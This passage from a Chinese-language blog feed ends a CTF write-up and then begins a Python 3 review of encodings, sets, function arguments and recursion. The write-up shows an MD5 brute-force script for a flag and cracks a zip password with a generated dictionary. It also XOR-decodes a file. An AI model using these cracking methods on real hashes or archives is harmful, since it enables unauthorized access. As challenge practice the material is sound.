<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">a = <span class="string">'38e4c352809e150186920aac37190cbc'</span></div><div class="line"></div><div class="line">dic = <span class="string">r"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~ "</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> dic:</div><div class="line">	<span class="keyword">for</span> i2 <span class="keyword">in</span> dic:</div><div class="line">		<span class="keyword">for</span> i3 <span class="keyword">in</span> dic:</div><div class="line">			<span class="keyword">for</span> i4 <span class="keyword">in</span> dic:</div><div class="line">				md5 = hashlib.md5()</div><div class="line">				b = <span class="string">'flag&#123;www_shiyanbar_com_is_very_good_'</span> +i1+i2+i3+i4+<span class="string">'&#125;'</span></div><div class="line">				md5.update(b)</div><div class="line">				<span class="keyword">if</span> md5.hexdigest() == a:</div><div class="line">					<span class="keyword">print</span> <span class="string">'%s  %s'</span> %(md5.hexdigest(),b)</div></pre></td></tr></table></figure>
<p>这样应该就是比较快的做法了，其中字符串前面加个<code>r</code>是指这是个raw string，不会转义<code>\</code>，也就是说<code>\n</code>是两个字符。</p>
<h2 id="0X0C-NSCTF250"><a href="#0X0C-NSCTF250" class="headerlink" title="0X0C-NSCTF250"></a>0X0C-NSCTF250</h2><p>一看显然这是一个流量包分析的题目，因为题目说了是下载文件，所以问题应该就处在下载文件上</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-09%20%E4%B8%8A%E5%8D%8811.53.24.png" alt="屏幕快照 2017-11-09 上午11.53.24.png" title="" class="">
                <p>屏幕快照 2017-11-09 上午11.53.24.png</p>
            </figure>
<p>我们通过wireshark分离出下载文件之后发现有一个压缩包和一个网页，打开网页，网页上写着：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">密码是nsfocus+5位数字，生成字典爆破</div></pre></td></tr></table></figure>
<p>那么我们就可以直接生成字典进行爆破了，但是感觉跑的时间有点久，可能是姿势不对(学会算法)，而且还下了很多毒：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-09%20%E4%B8%8B%E5%8D%8812.39.14.png" alt="屏幕快照 2017-11-09 下午12.39.14.png" title="" class="">
                <p>屏幕快照 2017-11-09 下午12.39.14.png</p>
            </figure>
<p>爆破出密码之后直接解开压缩包就找到flag了。</p>
<h2 id="0X0D-sssssss"><a href="#0X0D-sssssss" class="headerlink" title="0X0D-sssssss"></a>0X0D-sssssss</h2><p>首先下载一个文件无法打开，十六进制下看不出什么结果，然后根据题目描述中说的文件内容和标题有奸情，而文件内容中又有很多的s，所以猜测可能是需要将文件和<code>s</code>异或，那么首先要注意的一点就是要以二进制格式打开、保存文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line">resouce = open(<span class="string">'misc'</span>, <span class="string">'rb'</span>)</div><div class="line">result = open(<span class="string">'key.png'</span>, <span class="string">'wb+'</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> c <span class="keyword">in</span> resouce.read():</div><div class="line">    data = ord(c)</div><div class="line">    data ^= <span class="number">0x73</span></div><div class="line">    c = chr(data)</div><div class="line">    result.write(c)</div><div class="line"></div><div class="line">resouce.close()</div><div class="line">result.close()</div></pre></td></tr></table></figure>
<p>然后我们打开生成的key.png文件就可以看到我们所需要的flag了。</p>
]]></content>
      
        <categories>
            
            <category> 爆破 脚本 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python3-Review]]></title>
      <url>/2017/10/31/Python-Review/</url>
      <content type="html"><![CDATA[<p>也算是几个月没正经写过python了，是时候重拾这把宝刀了</p>
<a id="more"></a>
<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00-前言"></a>0X00-前言</h2><p>首先就是python这个东西广度太大，其次也是当初学python的时候不是系统的学习，导致现在有些东西还是不清楚，所以从初级的到高级特性对着廖雪峰的博客重新看了一遍，并补充一下自己的遗漏点。</p>
<hr>
<h2 id="0X01-Python基础部分"><a href="#0X01-Python基础部分" class="headerlink" title="0X01-Python基础部分"></a>0X01-Python基础部分</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>为了解决各种之间转换而出现乱码的原因，Unicode应运而生，Unicode把所有的语言都统一到一套编码中，Unicode的标准也是在不断的发展，最常用的是两个字节表示一个字符（如果要用到非常偏僻的字符，就需要四个字节）</p>
<p>现在，捋一捋ASCII编码和Unicode编码的区别：ASCII编码是1个字节，而Unicode编码通常是2个字节。</p>
<p>字母<code>A</code>用ASCII编码是十进制的<code>65</code>，二进制的<code>01000001</code>；</p>
<p>字符<code>0</code>用ASCII编码是十进制的<code>48</code>，二进制的<code>00110000</code>，注意字符<code>&#39;0&#39;</code>和整数<code>0</code>是不同的；</p>
<p>汉字<code>中</code>已经超出了ASCII编码的范围，用Unicode编码是十进制的<code>20013</code>，二进制的<code>01001110 00101101</code>。</p>
<p>你可以猜测，如果把ASCII编码的<code>A</code>用Unicode编码，只需要在前面补0就可以，因此，<code>A</code>的Unicode编码是<code>00000000 01000001</code>。</p>
<p>新的问题又出现了：如果统一成Unicode编码，乱码问题从此消失了。但是，如果你写的文本基本上全部是英文的话，用Unicode编码比ASCII编码需要多一倍的存储空间，在存储和传输上就十分不划算。</p>
<p>所以，本着节约的精神，又出现了把Unicode编码转化为”可变长编码””的<code>UTF-8</code>编码。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>ASCII</th>
<th>Unicode</th>
<th>UTF-8</th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>01000001</td>
<td>00000000 01000001</td>
<td>01000001</td>
</tr>
<tr>
<td>中</td>
<td>x</td>
<td>01001110 00101101</td>
<td>11100100 10111000 10101101</td>
</tr>
</tbody>
</table>
<p>从上面的表格还可以发现，UTF-8编码有一个额外的好处，就是ASCII编码实际上可以被看成是UTF-8编码的一部分，所以，大量只支持ASCII编码的历史遗留软件可以在UTF-8编码下继续工作。</p>
<p>搞清楚了ASCII、Unicode和UTF-8的关系，我们就可以总结一下现在计算机系统通用的字符编码工作方式：</p>
<p>在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码。</p>
<p>用记事本编辑的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8保存到文件：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-31%20%E4%B8%8B%E5%8D%885.11.16.png" alt="屏幕快照 2017-10-31 下午5.11.16.png" title="" class="">
                <p>屏幕快照 2017-10-31 下午5.11.16.png</p>
            </figure>
<p>那么这个时候可能会有人问为什么在内存中使用Unicode呢，全部使用UTF-8岂不是更好么，这个时候参照知乎上的答案来说应该是内存存储字节流的时候，字符不定长会给算法带来麻烦。比如说我们无法确定第2000个字符从哪里开始，所以会采用Unicode,而在存储的时候，自然是选择不定长的UTF-8了，这里还是扔出一个<a href="https://www.zhihu.com/question/52346583" target="_blank" rel="external">链接</a>。</p>
<p>还有一点需要注意的就是python3和python2的字符串编码差别还是挺大的，可以自行查阅一番。</p>
<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>接下来再来说说字符串的问题,python3中字符串使用的是Uncode编码，python2是ASCII，但是可以在配置做修改。</p>
<p>对于单个的字符串，python提供了<code>ord()</code>函数获取字符的整型表示，<code>chr()</code>函数将编码转换为对应的字符串</p>
<p>如果知道字符的整数编码，还可以使用十六进制写：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'\u4e2d\u6587'</span></div><div class="line"><span class="string">'中文'</span></div></pre></td></tr></table></figure>
<p>由于Python的字符串类型是<code>str</code>，在内存中以Unicode表示，一个字符对应若干个字节。如果要在网络上传输，或者保存到磁盘上，就需要把<code>str</code>变为以字节为单位的<code>bytes</code>。Python对<code>bytes</code>类型的数据用带<code>b</code>前缀的单引号或双引号表示,以Unicode表示的<code>str</code>可以通过<code>encode</code>方法编码为指定的<code>byte</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'ABC'</span>.encode(<span class="string">'ascii'</span>)</div><div class="line"><span class="string">b'ABC'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'中文'</span>.encode(<span class="string">'utf-8'</span>)</div><div class="line"><span class="string">b'\xe4\xb8\xad\xe6\x96\x87'</span></div></pre></td></tr></table></figure>
<p>中文无法使用<code>ASCII</code>编码，因为这已经超过了其编码的范围，反过来，如果我们从网络或磁盘上读取了字节流，那么读到的数据就是<code>bytes</code>。要把<code>bytes</code>变为<code>str</code>，就需要用<code>decode()</code>方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b'ABC'</span>.decode(<span class="string">'ascii'</span>)</div><div class="line"><span class="string">'ABC'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b'\xe4\xb8\xad\xe6\x96\x87'</span>.decode(<span class="string">'utf-8'</span>)</div><div class="line"><span class="string">'中文'</span></div></pre></td></tr></table></figure>
<p>关于格式修饰符部分就用一个小demo来代替吧，用字符串格式化显示出<code>&#39;xx.x%&#39;</code>，只保留小数点后1位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">print(<span class="string">'%.1f%%'</span> %((s2-s1)/s1*<span class="number">100</span>))</div></pre></td></tr></table></figure>
<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>set和dict类似，也是一组key的集合。但是不存储value。而且key值不能重复</p>
<p>要创建一个set，需要提供一个list作为输入集合：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s</div><div class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</div></pre></td></tr></table></figure>
<p>注意，传入的参数是一个list，只是表明这个set内部有这几个元素，现实的顺序也不表示set是有序的，重复的元素会在set中被自动过滤掉，使用<code>add(key)</code>方法可以添加元素到set中，<code>remove(key)</code>来删除元素，当然也可以重复添加，但是不会有效果：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = set([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s</div><div class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(<span class="number">4</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s</div><div class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(<span class="number">4</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s</div><div class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.remove(<span class="number">4</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s</div><div class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</div></pre></td></tr></table></figure>
<p>通过上面的特性我们不难发现，set可以看成数学上的无序集合，因此，两个ste可以做数学意义上的交集、并集操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = set([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s1 &amp; s2</div><div class="line">&#123;<span class="number">2</span>, <span class="number">3</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s1 | s2</div><div class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</div></pre></td></tr></table></figure>
<p>这里有一个在评论区需要注意的点，可以拿出来说一下，在给set函数传参的时候，以下几种情况：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = set((<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>))</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = set((<span class="number">1</span>,[<span class="number">2</span>, <span class="number">3</span>]))</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">TypeError: unhashable type: <span class="string">'list'</span></div></pre></td></tr></table></figure>
<p>那么这种情况到底是为什么呢？是因为set不接受可变参数，可能有人要问了，列表就是可变参数啊，列表在赋值给s的时候是将列表中的每个元素作为value赋值进去的，str是不可变对象，而在第三种情况下参数内有一个是列表，所以就会失败，如果把[2, 3]改为（2，3）就可以成功了。</p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>函数部分只有两个想说的，一个就是函数参数的问题，还有一个就是递归：</p>
<ol>
<li>可变参数</li>
</ol>
<p>在Python函数中，还可以定义可变参数。顾名思义，可变参数就是传入的参数个数是可变的，可以是1个、2个到任意个，还可以是0个。</p>
<p>我们以数学题为例子，给定一组数字a，b，c……，请计算a2 + b2 + c2 + ……。</p>
<p>要定义出这个函数，我们必须确定输入的参数。由于参数个数不确定，我们首先想到可以把a，b，c……作为一个list或tuple传进来，这样，函数可以定义如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(numbers)</span>:</span></div><div class="line">  sum = <span class="number">0</span></div><div class="line">  <span class="keyword">for</span> n <span class="keyword">in</span> numbers:</div><div class="line">    sum += n</div><div class="line">  <span class="keyword">return</span> sum</div></pre></td></tr></table></figure>
<p>但是在调用的时候，需要传入一个列表或者元组，如果利用可变参数，调用函数的方式可以简化成这样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(*numbers)</span>:</span></div><div class="line">    sum = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> numbers:</div><div class="line">        sum = sum + n * n</div><div class="line">    <span class="keyword">return</span> sum</div><div class="line"><span class="comment">#执行函数</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>calc(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</div><div class="line"><span class="number">14</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>calc(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>)</div><div class="line"><span class="number">84</span></div></pre></td></tr></table></figure>
<p>如果已经有一个list或者tuple，要调用一个可变参数怎么办？虽然可以使用下标一个个传，但是这样未免过于麻烦，所以Python允许在列表或者元组前面加一个<code>*</code>，把list或turple作为可变参数传递进去：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>calc(*nums)</div><div class="line"><span class="number">14</span></div></pre></td></tr></table></figure>
<ol>
<li>关键字参数</li>
</ol>
<p>可变参数允许你传入0个或任意个参数，这些可变参数在函数调用时自动组装为一个tuple。而关键字参数允许你传入0个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个dict。请看示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span><span class="params">(name, age, **kw)</span>:</span></div><div class="line">    print(<span class="string">'name:'</span>, name, <span class="string">'age:'</span>, age, <span class="string">'other:'</span>, kw)</div></pre></td></tr></table></figure>
<p>函数<code>person</code>除了必选参数<code>name</code>和<code>age</code>外，还接受关键字参数<code>kw</code>。在调用该函数时，可以只传入必选参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">'Michael'</span>, <span class="number">30</span>)</div><div class="line">name: Michael age: <span class="number">30</span> other: &#123;&#125;</div></pre></td></tr></table></figure>
<p>也可以传入任意个数的关键字参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">'Bob'</span>, <span class="number">35</span>, city=<span class="string">'Beijing'</span>)</div><div class="line">name: Bob age: <span class="number">35</span> other: &#123;<span class="string">'city'</span>: <span class="string">'Beijing'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">'Adam'</span>, <span class="number">45</span>, gender=<span class="string">'M'</span>, job=<span class="string">'Engineer'</span>)</div><div class="line">name: Adam age: <span class="number">45</span> other: &#123;<span class="string">'gender'</span>: <span class="string">'M'</span>, <span class="string">'job'</span>: <span class="string">'Engineer'</span>&#125;</div></pre></td></tr></table></figure>
<p>关键字参数有什么用？它可以扩展函数的功能。比如，在<code>person</code>函数里，我们保证能接收到<code>name</code>和<code>age</code>这两个参数，但是，如果调用者愿意提供更多的参数，我们也能收到。试想你正在做一个用户注册的功能，除了用户名和年龄是必填项外，其他都是可选项，利用关键字参数来定义这个函数就能满足注册的需求。</p>
<p>和可变参数类似，也可以先组装出一个dict，然后，把该dict转换为关键字参数传进去：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>extra = &#123;<span class="string">'city'</span>: <span class="string">'Beijing'</span>, <span class="string">'job'</span>: <span class="string">'Engineer'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">'Jack'</span>, <span class="number">24</span>, city=extra[<span class="string">'city'</span>], job=extra[<span class="string">'job'</span>])</div><div class="line">name: Jack age: <span class="number">24</span> other: &#123;<span class="string">'city'</span>: <span class="string">'Beijing'</span>, <span class="string">'job'</span>: <span class="string">'Engineer'</span>&#125;</div></pre></td></tr></table></figure>
<p>当然，上面复杂的调用可以用简化的写法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>extra = &#123;<span class="string">'city'</span>: <span class="string">'Beijing'</span>, <span class="string">'job'</span>: <span class="string">'Engineer'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">'Jack'</span>, <span class="number">24</span>, **extra)</div><div class="line">name: Jack age: <span class="number">24</span> other: &#123;<span class="string">'city'</span>: <span class="string">'Beijing'</span>, <span class="string">'job'</span>: <span class="string">'Engineer'</span>&#125;</div></pre></td></tr></table></figure>
<p><code>**extra</code>表示把<code>extra</code>这个dict的所有key-value用关键字参数传入到函数的<code>**kw</code>参数，<code>kw</code>将获得一个dict，注意<code>kw</code>获得的dict是<code>extra</code>的一份拷贝，对<code>kw</code>的改动不会影响到函数外的<code>extra</code>。</p>
<ol>
<li>命名关键字参数</li>
</ol>
<p>对于关键字参数，函数的调用者可以传入任意不受限制的关键字参数。至于到底传入了哪些，就需要在函数内部通过<code>kw</code>检查。</p>
<p>仍以<code>person()</code>函数为例，我们希望检查是否有<code>city</code>和<code>job</code>参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span><span class="params">(name, age, **kw)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'city'</span> <span class="keyword">in</span> kw:</div><div class="line">        <span class="comment"># 有city参数</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'job'</span> <span class="keyword">in</span> kw:</div><div class="line">        <span class="comment"># 有job参数</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">    print(<span class="string">'name:'</span>, name, <span class="string">'age:'</span>, age, <span class="string">'other:'</span>, kw)</div></pre></td></tr></table></figure>
<p>但是调用者仍可以传入不受限制的关键字参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">'Jack'</span>, <span class="number">24</span>, city=<span class="string">'Beijing'</span>, addr=<span class="string">'Chaoyang'</span>, zipcode=<span class="number">123456</span>)</div></pre></td></tr></table></figure>
<p>如果要限制关键字参数的名字，就可以用命名关键字参数，例如，只接收<code>city</code>和<code>job</code>作为关键字参数。这种方式定义的函数如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span><span class="params">(name, age, *, city, job)</span>:</span></div><div class="line">    print(name, age, city, job)</div></pre></td></tr></table></figure>
<p>和关键字参数<code>**kw</code>不同，命名关键字参数需要一个特殊分隔符<code>*</code>，<code>*</code>后面的参数被视为命名关键字参数。</p>
<p>调用方式如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">'Jack'</span>, <span class="number">24</span>, city=<span class="string">'Beijing'</span>, job=<span class="string">'Engineer'</span>)</div><div class="line">Jack <span class="number">24</span> Beijing Engineer</div></pre></td></tr></table></figure>
<p>如果函数定义中已经有了一个可变参数，后面跟着的命名关键字参数就不再需要一个特殊分隔符<code>*</code>了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span><span class="params">(name, age, *args, city, job)</span>:</span></div><div class="line">    print(name, age, args, city, job)</div></pre></td></tr></table></figure>
<p>命名关键字参数必须传入参数名，这和位置参数不同。如果没有传入参数名，调用将报错：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">'Jack'</span>, <span class="number">24</span>, <span class="string">'Beijing'</span>, <span class="string">'Engineer'</span>)</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">TypeError: person() takes <span class="number">2</span> positional arguments but <span class="number">4</span> were given</div></pre></td></tr></table></figure>
<p>由于调用时缺少参数名<code>city</code>和<code>job</code>，Python解释器把这4个参数均视为位置参数，但<code>person()</code>函数仅接受2个位置参数。</p>
<p>命名关键字参数可以有缺省值，从而简化调用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span><span class="params">(name, age, *, city=<span class="string">'Beijing'</span>, job)</span>:</span></div><div class="line">    print(name, age, city, job)</div></pre></td></tr></table></figure>
<p>由于命名关键字参数<code>city</code>具有默认值，调用时，可不传入<code>city</code>参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">'Jack'</span>, <span class="number">24</span>, job=<span class="string">'Engineer'</span>)</div><div class="line">Jack <span class="number">24</span> Beijing Engineer</div></pre></td></tr></table></figure>
<p>使用命名关键字参数时，要特别注意，如果没有可变参数，就必须加一个<code>*</code>作为特殊分隔符。如果缺少<code>*</code>，Python解释器将无法识别位置参数和命名关键字参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span><span class="params">(name, age, city, job)</span>:</span></div><div class="line">    <span class="comment"># 缺少 *，city和job被视为位置参数</span></div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure>
<p>Python中定义函数，可以用必选参数、默认参数、可变参数、关键字参数和命名关键字参数，这5种参数都可以组合使用。但是请注意，参数定义的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。</p>
<ol>
<li>递归函数</li>
</ol>
<p>递归函数也就是在函数内部调用自身，这里使用一个汉诺塔问题帮助理解，丢个代码就跑：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span><span class="params">(n, a, b, c)</span>:</span></div><div class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</div><div class="line">        print(a, <span class="string">'--&gt;'</span>, c)    <span class="comment"># 这是汉诺塔的正确玩法! </span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        move(n - <span class="number">1</span>, a, c, b)</div><div class="line">        move(<span class="number">1</span>, a, b, c)</div><div class="line">        move(n - <span class="number">1</span>, b, a, c)</div><div class="line"><span class="comment">#其实写出这个函数只需要搞清楚三步即可</span></div><div class="line"><span class="comment">#1. 除最后一层移至B</span></div><div class="line"><span class="comment">#2. 最后一层移至C</span></div><div class="line"><span class="comment">#3. 复原至C</span></div></pre></td></tr></table></figure>
<hr>
<h2 id="0X02-Python高级特性"><a href="#0X02-Python高级特性" class="headerlink" title="0X02-Python高级特性"></a>0X02-Python高级特性</h2><p>说到python的高级特性，那么就不得不提他的切片和列表生成式了，众所周知，python以它简洁的语法和广泛的用途而闻名。那么python到底能如何去优化我们的代码呢？首先就来说一下切片吧，取一个列表或者元组的部分元素是我们经常会使用到的操作：</p>
